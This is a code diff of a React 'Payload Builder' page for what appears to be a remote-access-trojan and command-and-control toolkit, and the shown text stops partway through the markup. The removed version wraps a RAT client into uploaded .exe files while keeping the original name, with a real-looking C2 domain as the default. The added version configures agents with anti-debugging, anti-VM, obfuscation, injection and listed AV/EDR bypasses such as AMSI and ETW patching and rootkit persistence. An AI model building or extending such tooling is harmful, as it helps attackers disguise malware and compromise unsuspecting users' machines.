@@ -1,513 +1,649 @@
-import React, { useState, useCallback } from 'react'
-import { useStore } from '@/stores/useStore'
-import { api } from '@/services/api'
-import { GradientBackground } from '@/components/ui/GradientBackground'
+import * as React from "react"
+import { useState } from "react"
+import { motion } from "framer-motion"
 import { GradientText } from '@/components/ui/GradientText'
+import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/Card'
 import { Button } from '@/components/ui/Button'
-import { Tabs, TabList, TabTrigger, TabContent } from '@/components/ui/Tabs'
-import { FileText, Upload, Download, Loader2, AlertCircle, CheckCircle, X, Settings, Shield, Code2 } from 'lucide-react'
-import clsx from 'clsx'
+import { Input } from '@/components/ui/Input'
+import { Textarea } from '@/components/ui/Textarea'
+import { Label } from '@/components/ui/Label'
+import { Switch } from '@/components/ui/Switch'
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/Select'
+import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/Tabs'
+import { cn } from '@/lib/utils'
+import { api } from '@/services/api'
+import type { PayloadConfig, BuildResult } from '@/types'
+import {
+  Box,
+  Download,
+  Loader2,
+  CheckCircle,
+  AlertCircle,
+  Shield,
+  Bug,
+  Cpu,
+  Globe,
+  Lock,
+  Eye,
+  EyeOff,
+  Zap,
+  Settings,
+  Terminal,
+  FileCode,
+  Copy,
+  Trash2,
+  Save,
+  Plus,
+  Minus,
+  ChevronDown,
+  ChevronUp,
+} from "lucide-react"
+import { toast } from 'sonner'
+
+const defaultConfig: PayloadConfig = {
+  ServerHost: 'localhost',
+  ServerPort: 8081,
+  Platform: 'windows',
+  Arch: 'x64',
+  Obfuscation: true,
+  AntiDebug: true,
+  AntiVM: true,
+  SleepObfuscation: true,
+  EncryptionKey: '',
+  CustomConfig: '',
+}
 
 export function PayloadBuilderPage() {
-  const [activeTab, setActiveTab] = useState<string>('builder')
-  const [uploadedFile, setUploadedFile] = useState<File | null>(null)
-  const [fileInfo, setFileInfo] = useState<{ name: string; size: number; type: string } | null>(null)
-  const [config, setConfig] = useState({
-    c2Host: 'thechoicervoicergames.com',
-    c2Port: '8080',
-    useTLS: false,
-    key: '',
-    hmacKey: '',
-    sleepInterval: 60,
-    jitter: 10,
-    persistence: false,
-    hideConsole: true,
-    antiDebug: true,
-    antiVM: true,
-    injectionMethod: 'reflective' as 'reflective' | 'manual' | 'thread_hijack',
-  })
+  const [config, setConfig] = useState<PayloadConfig>(defaultConfig)
   const [building, setBuilding] = useState(false)
-  const [buildProgress, setBuildProgress] = useState(0)
-  const [buildStatus, setBuildStatus] = useState('')
-  const [buildResult, setBuildResult] = useState<{ id: string; filename: string; url: string } | null>(null)
-  const [error, setError] = useState<string | null>(null)
-  const [history, setHistory] = useState<Array<{ id: string; filename: string; created_at: string; size: number; status: string }>>([])
+  const [result, setResult] = useState<BuildResult | null>(null)
+  const [activeTab, setActiveTab] = useState<'basic' | 'evasion' | 'advanced'>('basic')
+  const [showKey, setShowKey] = useState(false)
+  const [customConfigLines, setCustomConfigLines] = useState<string[]>([''])
 
-  const { addNotification } = useStore()
-
-  const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0]
-    if (!file) return
-
-    if (!file.name.endsWith('.exe')) {
-      setError('Only .exe files are supported')
-      return
-    }
-
-    setUploadedFile(file)
-    setFileInfo({
-      name: file.name,
-      size: file.size,
-      type: file.type
-    })
-    setError(null)
-  }, [])
-
-  const removeFile = useCallback(() => {
-    setUploadedFile(null)
-    setFileInfo(null)
-  }, [])
-
-  const buildPayload = async () => {
-    if (!uploadedFile) {
-      setError('Please upload an EXE file first')
-      return
-    }
-
-    if (!config.c2Host) {
-      setError('C2 host is required')
-      return
-    }
-
+  const handleBuild = async () => {
     setBuilding(true)
-    setBuildProgress(0)
-    setBuildStatus('Wrapping binary + injecting C2 config...')
-    setError(null)
-    setBuildResult(null)
-
+    setResult(null)
     try {
-      const formData = new FormData()
-      formData.append('binary', uploadedFile)
-      formData.append('c2_host', config.c2Host)
-      formData.append('c2_port', config.c2Port)
-      formData.append('use_tls', config.useTLS.toString())
-      formData.append('key', config.key)
-      formData.append('hmac_key', config.hmacKey)
-      formData.append('sleep_interval', config.sleepInterval.toString())
-      formData.append('jitter', config.jitter.toString())
-      formData.append('persistence', config.persistence.toString())
-      formData.append('hide_console', config.hideConsole.toString())
-      formData.append('anti_debug', config.antiDebug.toString())
-      formData.append('anti_vm', config.antiVM.toString())
-      formData.append('injection_method', config.injectionMethod)
-
-      setBuildProgress(40)
-      const result = await api.buildPayload(formData)
-
-      setBuildProgress(100)
-      setBuildStatus('Wrap complete — config embedded')
-      setBuildResult(result)
-
-      addNotification({
-        type: 'success',
-        message: `${fileInfo?.name} wrapped -> ${config.c2Host}`
+      const buildResult = await api.buildPayload(config)
+      setResult(buildResult)
+      if (buildResult.Success) {
+        toast.success('Payload built successfully!', {
+          description: `Binary: ${buildResult.BinaryName} (${(buildResult.Size / 1024).toFixed(1)} KB)`,
+        })
+      } else {
+        toast.error('Build failed', {
+          description: buildResult.Error,
+        })
+      }
+    } catch (error) {
+      toast.error('Build failed', {
+        description: error instanceof Error ? error.message : 'Unknown error',
       })
-
-      // Fire-and-forget history refresh; never let a history hiccup mask a good build.
-      loadHistory().catch(() => {})
-    } catch (err) {
-      setError(err instanceof Error ? err.message : (typeof err === 'string' ? err : 'Build failed'))
-      setBuildStatus('Build failed')
     } finally {
       setBuilding(false)
     }
   }
 
-  const loadHistory = async () => {
+  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, platform: 'windows' | 'linux') => {
+    const file = e.target.files?.[0]
+    if (!file) return
+    
     try {
-      const res = await api.getPayloadHistory()
-      setHistory(res || [])
-    } catch {
-      // Ignore
-    }
-  }
-
-  const downloadPayload = async (id: string, filename: string) => {
-    try {
-      const response = await fetch(`/api/payloads/${id}/download`, {
-        headers: {
-          'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
-        }
-      })
-      if (!response.ok) throw new Error('Download failed')
-      const blob = await response.blob()
-      const url = window.URL.createObjectURL(blob)
-      const a = document.createElement('a')
-      a.href = url
-      a.download = filename
-      document.body.appendChild(a)
-      a.click()
-      window.URL.revokeObjectURL(url)
-      document.body.removeChild(a)
-    } catch (err) {
-      addNotification({
-        type: 'error',
-        message: err instanceof Error ? err.message : 'Unknown error'
+      const result = await api.uploadAgentBinary(file, platform)
+      toast.success(`${platform} agent binary uploaded successfully`)
+    } catch (error) {
+      toast.error('Upload failed', {
+        description: error instanceof Error ? error.message : 'Unknown error',
       })
     }
   }
 
-  const deletePayload = async (id: string) => {
-    try {
-      await api.deletePayload(id)
-      loadHistory()
-      addNotification({
-        type: 'success',
-        message: 'Payload removed from history'
-      })
-    } catch (err) {
-      addNotification({
-        type: 'error',
-        message: err instanceof Error ? err.message : 'Unknown error'
-      })
-    }
+  const generateEncryptionKey = () => {
+    const key = Array.from(crypto.getRandomValues(new Uint8Array(32)))
+      .map(b => b.toString(16).padStart(2, '0'))
+      .join('')
+    setConfig(prev => ({ ...prev, EncryptionKey: key }))
+    toast.success('Encryption key generated')
   }
+
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text)
+    toast.success('Copied to clipboard')
+  }
+
+  const platformOptions = [
+    { value: 'windows', label: 'Windows', icon: <Globe className="w-4 h-4" /> },
+    { value: 'linux', label: 'Linux', icon: <Terminal className="w-4 h-4" /> },
+  ]
+
+  const archOptions = [
+    { value: 'x64', label: 'x64 (64-bit)' },
+    { value: 'x86', label: 'x86 (32-bit)' },
+    { value: 'arm64', label: 'ARM64' },
+  ]
 
   return (
-    <div className="min-h-screen">
-      <GradientBackground className="fixed inset-0 z-0" />
-      <div className="relative z-10 p-6 max-w-5xl mx-auto">
-        <div className="mb-8">
-          <GradientText className="text-3xl font-bold mb-2">Payload Builder</GradientText>
-          <p className="text-dark-400">
-            Upload an EXE and wrap the RAT client into it, preserving the original filename and app name.
-            The modified binary connects back to your C2 server with the configured settings.
-          </p>
+    <div className="space-y-6 animate-fade-in max-w-6xl mx-auto">
+      {/* Header */}
+      <motion.div
+        initial={{ opacity: 0, y: -20 }}
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ duration: 0.4 }}
+        className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4"
+      >
+        <div>
+          <GradientText className="text-3xl font-bold" colors={['#fff', '#d946ef', '#a855f7']}>
+            Payload Builder
+          </GradientText>
+          <p className="text-dark-400 mt-1">Create customized agent payloads with evasion techniques</p>
         </div>
+      </motion.div>
 
+      {/* Tabs */}
+      <motion.div
+        initial={{ opacity: 0, y: 20 }}
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ duration: 0.4, delay: 0.1 }}
+      >
         <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
-          <TabList className="grid w-full grid-cols-2">
-            <TabTrigger value="builder">
-              <div className="flex items-center gap-2">
-                <Code2 className="w-4 h-4" />
-                Build Payload
-              </div>
-            </TabTrigger>
-            <TabTrigger value="history">
-              <div className="flex items-center gap-2">
-                <FileText className="w-4 h-4" />
-                History
-              </div>
-            </TabTrigger>
-          </TabList>
+          <TabsList className="grid w-full grid-cols-3 bg-dark-800/50 p-1 rounded-lg border border-dark-700">
+            <TabsTrigger value="basic" className="gap-2">
+              <Box className="w-4 h-4" />
+              <span>Basic Config</span>
+            </TabsTrigger>
+            <TabsTrigger value="evasion" className="gap-2">
+              <Shield className="w-4 h-4" />
+              <span>Evasion</span>
+            </TabsTrigger>
+            <TabsTrigger value="advanced" className="gap-2">
+              <Settings className="w-4 h-4" />
+              <span>Advanced</span>
+            </TabsTrigger>
+          </TabsList>
 
-          <TabContent value="builder" className="mt-6">
-            {!uploadedFile ? (
-              <div className="bg-dark-800/50 border border-dark-700 rounded-xl p-8 text-center">
-                <input
-                  type="file"
-                  accept=".exe"
-                  onChange={handleFileUpload}
-                  id="exe-upload"
-                  className="hidden"
-                />
-                <label htmlFor="exe-upload" className="cursor-pointer">
-                  <Upload className="w-16 h-16 mx-auto text-dark-500 mb-4 opacity-50" />
-                  <p className="text-dark-300 mb-2">Drag & drop or click to upload an EXE file</p>
-                  <p className="text-dark-500 text-sm">Maximum size: 100MB</p>
-                </label>
-              </div>
-            ) : (
-              <div className="space-y-6">
-                <div className="bg-dark-800/50 border border-dark-700 rounded-xl p-4">
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-3">
-                      <FileText className="w-10 h-10 text-accent-500 bg-accent-500/10 rounded-lg flex items-center justify-center" />
-                      <div>
-                        <p className="font-medium text-dark-100">{fileInfo?.name}</p>
-                        <p className="text-dark-500 text-sm">
-                          {fileInfo?.size ? `${(fileInfo.size / 1024 / 1024).toFixed(2)} MB` : 'Unknown size'}
-                        </p>
-                      </div>
-                    </div>
+          {/* Basic Config Tab */}
+          <TabsContent value="basic" className="space-y-6 mt-4">
+            <Card className="card-hover">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Globe className="w-5 h-5 text-accent-400" />
+                  Server Configuration
+                </CardTitle>
+                <CardDescription>C2 server connection settings</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="serverHost">Server Host</Label>
+                    <Input
+                      id="serverHost"
+                      value={config.ServerHost}
+                      onChange={(e) => setConfig(prev => ({ ...prev, ServerHost: e.target.value }))}
+                      placeholder="c2.example.com or IP"
+                    />
+                  </div>
+                  <div className="space-y-2">
+                    <Label htmlFor="serverPort">Server Port</Label>
+                    <Input
+                      id="serverPort"
+                      type="number"
+                      value={config.ServerPort}
+                      onChange={(e) => setConfig(prev => ({ ...prev, ServerPort: parseInt(e.target.value) || 8081 }))}
+                      placeholder="8081"
+                    />
+                  </div>
+                </div>
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label>Target Platform</Label>
+                    <Select value={config.Platform} onValueChange={(v) => setConfig(prev => ({ ...prev, Platform: v as 'windows' | 'linux' }))}>
+                      <SelectTrigger>
+                        <SelectValue placeholder="Select platform" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {platformOptions.map(opt => (
+                          <SelectItem key={opt.value} value={opt.value}>
+                            <div className="flex items-center gap-2">
+                              {opt.icon}
+                              <span>{opt.label}</span>
+                            </div>
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+                  <div className="space-y-2">
+                    <Label>Architecture</Label>
+                    <Select value={config.Arch} onValueChange={(v) => setConfig(prev => ({ ...prev, Arch: v as 'x64' | 'x86' | 'arm64' }))}>
+                      <SelectTrigger>
+                        <SelectValue placeholder="Select architecture" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {archOptions.map(opt => (
+                          <SelectItem key={opt.value} value={opt.value}>{opt.label}</SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
 
-                    <div className="text-dark-500 text-xs mt-2">
-                      Maximum size: 300MB
-                    </div>
-                    <Button variant="ghost" size="sm" onClick={removeFile}>
-                      <X className="w-4 h-4" />
+            <Card className="card-hover">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Lock className="w-5 h-5 text-accent-400" />
+                  Encryption
+                </CardTitle>
+                <CardDescription>AES-256 encryption key for C2 communications</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="space-y-2">
+                  <Label htmlFor="encryptionKey">Encryption Key (64 hex chars)</Label>
+                  <div className="flex items-center gap-2">
+                    <Input
+                      id="encryptionKey"
+                      type={showKey ? 'text' : 'password'}
+                      value={config.EncryptionKey}
+                      onChange={(e) => setConfig(prev => ({ ...prev, EncryptionKey: e.target.value }))}
+                      placeholder="Auto-generated if empty"
+                      className="flex-1 font-mono"
+                    />
+                    <Button variant="outline" size="icon" onClick={() => setShowKey(!showKey)}>
+                      {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                    </Button>
+                    <Button variant="outline" size="icon" onClick={generateEncryptionKey}>
+                      <Zap className="w-4 h-4" />
+                    </Button>
+                    <Button variant="outline" size="icon" onClick={() => copyToClipboard(config.EncryptionKey)} disabled={!config.EncryptionKey}>
+                      <Copy className="w-4 h-4" />
                     </Button>
                   </div>
+                  <p className="text-xs text-dark-500">Leave empty to auto-generate. Key must be 64 hex characters (32 bytes).</p>
                 </div>
+              </CardContent>
+            </Card>
+          </TabsContent>
 
-                <div className="grid gap-6 md:grid-cols-2">
-                  <div className="bg-dark-800/50 border border-dark-700 rounded-xl p-6">
-                    <h3 className="font-semibold text-dark-100 mb-4 flex items-center gap-2">
-                      <Shield className="w-5 h-5 text-accent-500" />
-                      C2 Configuration
-                    </h3>
-                    <div className="space-y-4">
-                      <div>
-                        <label className="block text-sm text-dark-400 mb-1">C2 Host *</label>
-                        <input
-                          type="text"
-                          value={config.c2Host}
-                          onChange={(e) => setConfig({ ...config, c2Host: e.target.value })}
-                          placeholder="c2.example.com or IP"
-                          className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 placeholder-dark-500 focus:border-accent-500 focus:outline-none"
-                        />
-                      </div>
-                      <div className="grid grid-cols-2 gap-4">
+          {/* Evasion Tab */}
+          <TabsContent value="evasion" className="space-y-6 mt-4">
+            <Card className="card-hover">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Shield className="w-5 h-5 text-accent-400" />
+                  Anti-Analysis Techniques
+                </CardTitle>
+                <CardDescription>Enable evasion techniques to bypass AV/EDR detection</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                  <div className="space-y-4">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <Bug className="w-5 h-5 text-accent-400" />
                         <div>
-                          <label className="block text-sm text-dark-400 mb-1">Port</label>
-                          <input
-                            type="number"
-                            value={config.c2Port}
-                            onChange={(e) => setConfig({ ...config, c2Port: e.target.value })}
-                            className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 focus:border-accent-500 focus:outline-none"
-                          />
-                        </div>
-                        <div className="flex items-end">
-                          <label className="flex items-center gap-2 cursor-pointer">
-                            <input
-                              type="checkbox"
-                              checked={config.useTLS}
-                              onChange={(e) => setConfig({ ...config, useTLS: e.target.checked })}
-                              className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
-                            />
-                            <span className="text-sm text-dark-300">Use TLS/mTLS</span>
-                          </label>
+                          <p className="font-medium text-dark-100">Anti-Debugging</p>
+                          <p className="text-sm text-dark-500">Detects debugger attachment</p>
                         </div>
                       </div>
-                      <div>
-                        <label className="block text-sm text-dark-400 mb-1">Encryption Key (32 bytes hex)</label>
-                        <input
-                          type="text"
-                          value={config.key}
-                          onChange={(e) => setConfig({ ...config, key: e.target.value })}
-                          placeholder="Auto-generated if empty"
-                          className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 placeholder-dark-500 focus:border-accent-500 focus:outline-none font-mono text-sm"
-                        />
-                      </div>
-                      <div>
-                        <label className="block text-sm text-dark-400 mb-1">HMAC Key (32 bytes hex)</label>
-                        <input
-                          type="text"
-                          value={config.hmacKey}
-                          onChange={(e) => setConfig({ ...config, hmacKey: e.target.value })}
-                          placeholder="Auto-generated if empty"
-                          className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 placeholder-dark-500 focus:border-accent-500 focus:outline-none font-mono text-sm"
-                        />
-                      </div>
-                    </div>
-                  </div>
-
-                  <div className="bg-dark-800/50 border border-dark-700 rounded-xl p-6">
-                    <h3 className="font-semibold text-dark-100 mb-4 flex items-center gap-2">
-                      <Settings className="w-5 h-5 text-accent-500" />
-                      Behavioral Settings
-                    </h3>
-                    <div className="space-y-4">
-                      <div className="grid grid-cols-2 gap-4">
-                        <div>
-                          <label className="block text-sm text-dark-400 mb-1">Sleep Interval (seconds)</label>
-                          <input
-                            type="number"
-                            value={config.sleepInterval}
-                            onChange={(e) => setConfig({ ...config, sleepInterval: parseInt(e.target.value) || 60 })}
-                            min="1"
-                            max="3600"
-                            className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 focus:border-accent-500 focus:outline-none"
-                          />
-                        </div>
-                        <div>
-                          <label className="block text-sm text-dark-400 mb-1">Jitter (%)</label>
-                          <input
-                            type="number"
-                            value={config.jitter}
-                            onChange={(e) => setConfig({ ...config, jitter: parseInt(e.target.value) || 0 })}
-                            min="0"
-                            max="100"
-                            className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 focus:border-accent-500 focus:outline-none"
-                          />
-                        </div>
-                      </div>
-                      <div className="grid grid-cols-2 gap-4">
-                        <label className="flex items-center gap-2 cursor-pointer">
-                          <input
-                            type="checkbox"
-                            checked={config.persistence}
-                            onChange={(e) => setConfig({ ...config, persistence: e.target.checked })}
-                            className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
-                          />
-                          <span className="text-sm text-dark-300">Enable Persistence</span>
-                        </label>
-                        <label className="flex items-center gap-2 cursor-pointer">
-                          <input
-                            type="checkbox"
-                            checked={config.hideConsole}
-                            onChange={(e) => setConfig({ ...config, hideConsole: e.target.checked })}
-                            className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
-                          />
-                          <span className="text-sm text-dark-300">Hide Console Window</span>
-                        </label>
-                      </div>
-                      <div className="grid grid-cols-2 gap-4">
-                        <label className="flex items-center gap-2 cursor-pointer">
-                          <input
-                            type="checkbox"
-                            checked={config.antiDebug}
-                            onChange={(e) => setConfig({ ...config, antiDebug: e.target.checked })}
-                            className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
-                          />
-                          <span className="text-sm text-dark-300">Anti-Debug</span>
-                        </label>
-                        <label className="flex items-center gap-2 cursor-pointer">
-                          <input
-                            type="checkbox"
-                            checked={config.antiVM}
-                            onChange={(e) => setConfig({ ...config, antiVM: e.target.checked })}
-                            className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
-                          />
-                          <span className="text-sm text-dark-300">Anti-VM</span>
-                        </label>
-                      </div>
-                      <div>
-                        <label className="block text-sm text-dark-400 mb-1">Injection Method</label>
-                        <select
-                          value={config.injectionMethod}
-                          onChange={(e) => setConfig({ ...config, injectionMethod: e.target.value as any })}
-                          className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 focus:border-accent-500 focus:outline-none"
-                        >
-                          <option value="reflective">Reflective DLL Injection</option>
-                          <option value="manual">Manual Mapping</option>
-                          <option value="thread_hijack">Thread Hijacking</option>
-                        </select>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                {error && (
-                  <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-4 flex items-center gap-3 text-red-400">
-                    <AlertCircle className="w-5 h-5 flex-shrink-0" />
-                    <span>{error}</span>
-                  </div>
-                )}
-
-                <Button
-                  onClick={buildPayload}
-                  disabled={building || !uploadedFile}
-                  className="w-full py-3 text-lg"
-                  size="lg"
-                >
-                  {building ? (
-                    <>
-                      <Loader2 className="w-5 h-5 animate-spin mr-2" />
-                      Building... {buildProgress}%
-                    </>
-                  ) : (
-                    <>
-                      <Code2 className="w-5 h-5 mr-2" />
-                      Build Payload
-                    </>
-                  )}
-                </Button>
-
-                {building && (
-                  <div className="space-y-2">
-                    <div className="w-full bg-dark-900 rounded-full h-2 overflow-hidden">
-                      <div
-                        className="bg-accent-500 h-full rounded-full transition-all duration-300"
-                        style={{ width: `${buildProgress}%` }}
+                      <Switch
+                        checked={config.AntiDebug}
+                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, AntiDebug: checked }))}
                       />
                     </div>
-                    <p className="text-dark-400 text-sm text-center">{buildStatus}</p>
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <Cpu className="w-5 h-5 text-accent-400" />
+                        <div>
+                          <p className="font-medium text-dark-100">Anti-VM</p>
+                          <p className="text-sm text-dark-500">Detects virtual machine environments</p>
+                        </div>
+                      </div>
+                      <Switch
+                        checked={config.AntiVM}
+                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, AntiVM: checked }))}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <Zap className="w-5 h-5 text-accent-400" />
+                        <div>
+                          <p className="font-medium text-dark-100">Sleep Obfuscation</p>
+                          <p className="text-sm text-dark-500">Encrypts memory during sleep</p>
+                        </div>
+                      </div>
+                      <Switch
+                        checked={config.SleepObfuscation}
+                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, SleepObfuscation: checked }))}
+                      />
+                    </div>
+                  </div>
+                  <div className="space-y-4">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <FileCode className="w-5 h-5 text-accent-400" />
+                        <div>
+                          <p className="font-medium text-dark-100">Code Obfuscation</p>
+                          <p className="text-sm text-dark-500">Obfuscates strings and control flow</p>
+                        </div>
+                      </div>
+                      <Switch
+                        checked={config.Obfuscation}
+                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, Obfuscation: checked }))}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <Lock className="w-5 h-5 text-accent-400" />
+                        <div>
+                          <p className="font-medium text-dark-100">Encrypted Communications</p>
+                          <p className="text-sm text-dark-500">AES-256 encrypted C2 traffic</p>
+                        </div>
+                      </div>
+                      <Switch
+                        checked={!!config.EncryptionKey}
+                        onCheckedChange={(checked) => {
+                          if (!checked) setConfig(prev => ({ ...prev, EncryptionKey: '' }))
+                        }}
+                      />
+                    </div>
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <Settings className="w-5 h-5 text-accent-400" />
+                        <div>
+                          <p className="font-medium text-dark-100">Process Injection</p>
+                          <p className="text-sm text-dark-500">Inject into legitimate processes</p>
+                        </div>
+                      </div>
+                      <Switch
+                        checked={false}
+                        onCheckedChange={() => {}}
+                      />
+                    </div>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+
+            <Card className="card-hover">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Terminal className="w-5 h-5 text-accent-400" />
+                  Windows-Specific Evasion
+                </CardTitle>
+                <CardDescription>Additional evasion techniques for Windows targets</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">AMSI Bypass</p>
+                    <p className="text-sm text-dark-500">Bypass Antimalware Scan Interface</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">ETW Patching</p>
+                    <p className="text-sm text-dark-500">Disable Event Tracing for Windows</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">PPID Spoofing</p>
+                    <p className="text-sm text-dark-500">Spoof parent process ID</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">DLL Unhooking</p>
+                    <p className="text-sm text-dark-500">Restore original syscalls</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">Heap Encryption</p>
+                    <p className="text-sm text-dark-500">Encrypt heap allocations</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">Stack Spoofing</p>
+                    <p className="text-sm text-dark-500">Fake stack frames</p>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+
+            <Card className="card-hover">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Terminal className="w-5 h-5 text-accent-400" />
+                  Linux-Specific Evasion
+                </CardTitle>
+                <CardDescription>Additional evasion techniques for Linux targets</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">LD_PRELOAD Injection</p>
+                    <p className="text-sm text-dark-500">Preload malicious shared library</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">Ptrace Evasion</p>
+                    <p className="text-sm text-dark-500">Anti-debugging via ptrace</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">Seccomp Bypass</p>
+                    <p className="text-sm text-dark-500">Bypass syscall filtering</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">Namespace Escape</p>
+                    <p className="text-sm text-dark-500">Container breakout techniques</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">EBPF Hiding</p>
+                    <p className="text-sm text-dark-500">Hide from eBPF monitors</p>
+                  </div>
+                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
+                    <p className="font-medium text-dark-100">Rootkit Persistence</p>
+                    <p className="text-sm text-dark-500">Kernel-level persistence</p>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+          </TabsContent>
+
+          {/* Advanced Tab */}
+          <TabsContent value="advanced" className="space-y-6 mt-4">
+            <Card className="card-hover">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <FileCode className="w-5 h-5 text-accent-400" />
+                  Custom Configuration
+                </CardTitle>
+                <CardDescription>Additional JSON configuration for advanced features</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="space-y-2">
+                  <Label htmlFor="customConfig">Custom Config (JSON)</Label>
+                  <Textarea
+                    id="customConfig"
+                    value={config.CustomConfig}
+                    onChange={(e) => setConfig(prev => ({ ...prev, CustomConfig: e.target.value }))}
+                    placeholder='{"key": "value"}'
+                    className="font-mono text-sm bg-dark-950 border-dark-700"
+                    rows={10}
+                  />
+                </div>
+                <div className="flex items-center gap-2">
+                  <Button variant="outline" onClick={() => {
+                    setConfig(prev => ({ ...prev, CustomConfig: JSON.stringify({
+                      beacon_interval: 5000,
+                      jitter: 0.3,
+                      max_retries: 3,
+                      user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                      headers: {},
+                      proxy: "",
+                      kill_date: "",
+                    }, null, 2) }))
+                  }}>
+                    Load Template
+                  </Button>
+                  <Button variant="outline" onClick={() => setConfig(prev => ({ ...prev, CustomConfig: '' }))}>
+                    Clear
+                  </Button>
+                </div>
+              </CardContent>
+            </Card>
+
+            <Card className="card-hover">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Download className="w-5 h-5 text-accent-400" />
+                  Custom Agent Binary Upload
+                </CardTitle>
+                <CardDescription>Upload your own compiled agent binaries</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                  <div className="space-y-4">
